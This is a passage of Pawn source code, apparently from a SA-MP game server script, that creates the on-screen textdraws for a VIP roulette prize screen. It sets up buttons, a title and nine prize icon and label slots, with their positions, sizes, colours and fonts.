	PlayerTextDrawSetProportional(playerid, RoulettePTD_AD_Price[playerid], 1);
	PlayerTextDrawSetShadow(playerid, RoulettePTD_AD_Price[playerid], 0);
	return 1;
}

stock CreateRoulettePTD_Roll(playerid)
{
	RoulettePTD_Roll[playerid][0] = CreatePlayerTextDraw(playerid, 37.2666, 127.2074, "perfect:vip_roll_back"); // пусто
	PlayerTextDrawTextSize(playerid, RoulettePTD_Roll[playerid][0], 565.3603, 139.8200);
	PlayerTextDrawAlignment(playerid, RoulettePTD_Roll[playerid][0], 1);
	PlayerTextDrawColor(playerid, RoulettePTD_Roll[playerid][0], -1);
	PlayerTextDrawBackgroundColor(playerid, RoulettePTD_Roll[playerid][0], 255);
	PlayerTextDrawFont(playerid, RoulettePTD_Roll[playerid][0], 4);
	PlayerTextDrawSetProportional(playerid, RoulettePTD_Roll[playerid][0], 0);
	PlayerTextDrawSetShadow(playerid, RoulettePTD_Roll[playerid][0], 0);

	RoulettePTD_Roll[playerid][1] = CreatePlayerTextDraw(playerid, 37.3333, 286.4962, "perfect:vip_roll_update"); // пусто
	PlayerTextDrawTextSize(playerid, RoulettePTD_Roll[playerid][1], 102.0000, 34.8700);
	PlayerTextDrawAlignment(playerid, RoulettePTD_Roll[playerid][1], 1);
	PlayerTextDrawColor(playerid, RoulettePTD_Roll[playerid][1], -1);
	PlayerTextDrawBackgroundColor(playerid, RoulettePTD_Roll[playerid][1], 255);
	PlayerTextDrawFont(playerid, RoulettePTD_Roll[playerid][1], 4);
	PlayerTextDrawSetProportional(playerid, RoulettePTD_Roll[playerid][1], 0);
	PlayerTextDrawSetShadow(playerid, RoulettePTD_Roll[playerid][1], 0);
	PlayerTextDrawSetSelectable(playerid, RoulettePTD_Roll[playerid][1], true);

	RoulettePTD_Roll[playerid][2] = CreatePlayerTextDraw(playerid, 473.9998, 286.0815, "perfect:vip_roll_change"); // пусто
	PlayerTextDrawTextSize(playerid, RoulettePTD_Roll[playerid][2], 129.0000, 35.0000);
	PlayerTextDrawAlignment(playerid, RoulettePTD_Roll[playerid][2], 1);
	PlayerTextDrawColor(playerid, RoulettePTD_Roll[playerid][2], -1);
	PlayerTextDrawBackgroundColor(playerid, RoulettePTD_Roll[playerid][2], 255);
	PlayerTextDrawFont(playerid, RoulettePTD_Roll[playerid][2], 4);
	PlayerTextDrawSetProportional(playerid, RoulettePTD_Roll[playerid][2], 0);
	PlayerTextDrawSetShadow(playerid, RoulettePTD_Roll[playerid][2], 0);
	PlayerTextDrawSetSelectable(playerid, RoulettePTD_Roll[playerid][2], true);

	RoulettePTD_Roll[playerid][3] = CreatePlayerTextDraw(playerid, 499.9998, 127.3223, "perfect:vip_roll_close"); // пусто
	PlayerTextDrawTextSize(playerid, RoulettePTD_Roll[playerid][3], 103.0000, 35.0000);
	PlayerTextDrawAlignment(playerid, RoulettePTD_Roll[playerid][3], 1);
	PlayerTextDrawColor(playerid, RoulettePTD_Roll[playerid][3], -1);
	PlayerTextDrawBackgroundColor(playerid, RoulettePTD_Roll[playerid][3], 255);
	PlayerTextDrawFont(playerid, RoulettePTD_Roll[playerid][3], 4);
	PlayerTextDrawSetProportional(playerid, RoulettePTD_Roll[playerid][3], 0);
	PlayerTextDrawSetShadow(playerid, RoulettePTD_Roll[playerid][3], 0);
	PlayerTextDrawSetSelectable(playerid, RoulettePTD_Roll[playerid][3], true);

	RoulettePTD_Roll[playerid][4] = CreatePlayerTextDraw(playerid, 250.6665, 286.1964, "perfect:vip_roll_start"); // пусто
	PlayerTextDrawTextSize(playerid, RoulettePTD_Roll[playerid][4], 139.0000, 35.0000);
	PlayerTextDrawAlignment(playerid, RoulettePTD_Roll[playerid][4], 1);
	PlayerTextDrawColor(playerid, RoulettePTD_Roll[playerid][4], -1);
	PlayerTextDrawBackgroundColor(playerid, RoulettePTD_Roll[playerid][4], 255);
	PlayerTextDrawFont(playerid, RoulettePTD_Roll[playerid][4], 4);
	PlayerTextDrawSetProportional(playerid, RoulettePTD_Roll[playerid][4], 0);
	PlayerTextDrawSetShadow(playerid, RoulettePTD_Roll[playerid][4], 0);
	PlayerTextDrawSetSelectable(playerid, RoulettePTD_Roll[playerid][4], true);

	RoulettePTD_Roll[playerid][5] = CreatePlayerTextDraw(playerid, 53.6666, 132.7555, "VIP_pyћe¦ka"); // пусто
	PlayerTextDrawLetterSize(playerid, RoulettePTD_Roll[playerid][5], 0.5193, 2.3839);
	PlayerTextDrawAlignment(playerid, RoulettePTD_Roll[playerid][5], 1);
	PlayerTextDrawColor(playerid, RoulettePTD_Roll[playerid][5], -1);
	PlayerTextDrawBackgroundColor(playerid, RoulettePTD_Roll[playerid][5], 255);
	PlayerTextDrawFont(playerid, RoulettePTD_Roll[playerid][5], 1);
	PlayerTextDrawSetProportional(playerid, RoulettePTD_Roll[playerid][5], 1);
	PlayerTextDrawSetShadow(playerid, RoulettePTD_Roll[playerid][5], 0);

	/////////////////////////////////////////////////////////////////////////////////////
	RoulettePTD_Roll_Icon[playerid][0] = CreatePlayerTextDraw(playerid, 49.6666, 186.1111, "-"); // prize 1
	RoulettePTD_Roll_Icon[playerid][1] = CreatePlayerTextDraw(playerid, 110.3333, 186.1110, "-"); // prize 2
	RoulettePTD_Roll_Icon[playerid][2] = CreatePlayerTextDraw(playerid, 171.3333, 186.1111, "-"); // prize 3
	RoulettePTD_Roll_Icon[playerid][3] = CreatePlayerTextDraw(playerid, 233.0000, 186.1111, "-"); // prize 4
	RoulettePTD_Roll_Icon[playerid][4] = CreatePlayerTextDraw(playerid, 293.6666, 186.5259, "-"); // prize 5
	RoulettePTD_Roll_Icon[playerid][5] = CreatePlayerTextDraw(playerid, 355.3332, 186.1111, "-"); // prize 6
	RoulettePTD_Roll_Icon[playerid][6] = CreatePlayerTextDraw(playerid, 416.0000, 186.1111, "-"); // prize 7
	RoulettePTD_Roll_Icon[playerid][7] = CreatePlayerTextDraw(playerid, 477.3333, 186.1111, "-"); // prize 8
	RoulettePTD_Roll_Icon[playerid][8] = CreatePlayerTextDraw(playerid, 538.0000, 186.1111, "-"); // prize 9
	for(new i = 0; i < 9; i ++)
	{
		PlayerTextDrawTextSize(playerid, RoulettePTD_Roll_Icon[playerid][i], 52.2399, 65.2500);
		PlayerTextDrawAlignment(playerid, RoulettePTD_Roll_Icon[playerid][i], 1);
		PlayerTextDrawColor(playerid, RoulettePTD_Roll_Icon[playerid][i], -1);
		PlayerTextDrawBackgroundColor(playerid, RoulettePTD_Roll_Icon[playerid][i], 255);
		PlayerTextDrawFont(playerid, RoulettePTD_Roll_Icon[playerid][i], 4);
		PlayerTextDrawSetProportional(playerid, RoulettePTD_Roll_Icon[playerid][i], 0);
		PlayerTextDrawSetShadow(playerid, RoulettePTD_Roll_Icon[playerid][i], 0);
	}

	RoulettePTD_Roll_Text[playerid][0] = CreatePlayerTextDraw(playerid, 75.9999, 225.2592, "-"); // prize 1
	RoulettePTD_Roll_Text[playerid][1] = CreatePlayerTextDraw(playerid, 136.6666, 225.2592, "-"); // prize 2
	RoulettePTD_Roll_Text[playerid][2] = CreatePlayerTextDraw(playerid, 197.6666, 225.2593, "-"); // prize 3
	RoulettePTD_Roll_Text[playerid][3] = CreatePlayerTextDraw(playerid, 259.3332, 225.2593, "-"); // prize 4
	RoulettePTD_Roll_Text[playerid][4] = CreatePlayerTextDraw(playerid, 319.9998, 225.6741, "-"); // prize 5
	RoulettePTD_Roll_Text[playerid][5] = CreatePlayerTextDraw(playerid, 381.6665, 225.2593, "-"); // prize 6
	RoulettePTD_Roll_Text[playerid][6] = CreatePlayerTextDraw(playerid, 442.3332, 225.2593, "-"); // prize 7
	RoulettePTD_Roll_Text[playerid][7] = CreatePlayerTextDraw(playerid, 503.6665, 225.2593, "-"); // prize 8
	RoulettePTD_Roll_Text[playerid][8] = CreatePlayerTextDraw(playerid, 564.3333, 225.2593, "-"); // prize 9
	for(new i = 0; i < 9; i ++)
	{
		PlayerTextDrawLetterSize(playerid, RoulettePTD_Roll_Text[playerid][i], 0.2176, 1.0814);
		PlayerTextDrawAlignment(playerid, RoulettePTD_Roll_Text[playerid][i], 2);
		PlayerTextDrawColor(playerid, RoulettePTD_Roll_Text[playerid][i], -1);
		PlayerTextDrawBackgroundColor(playerid, RoulettePTD_Roll_Text[playerid][i], 255);
		PlayerTextDrawFont(playerid, RoulettePTD_Roll_Text[playerid][i], 1);
		PlayerTextDrawSetProportional(playerid, RoulettePTD_Roll_Text[playerid][i], 1);
		PlayerTextDrawSetShadow(playerid, RoulettePTD_Roll_Text[playerid][i], 0);
	}
	return 1;
}

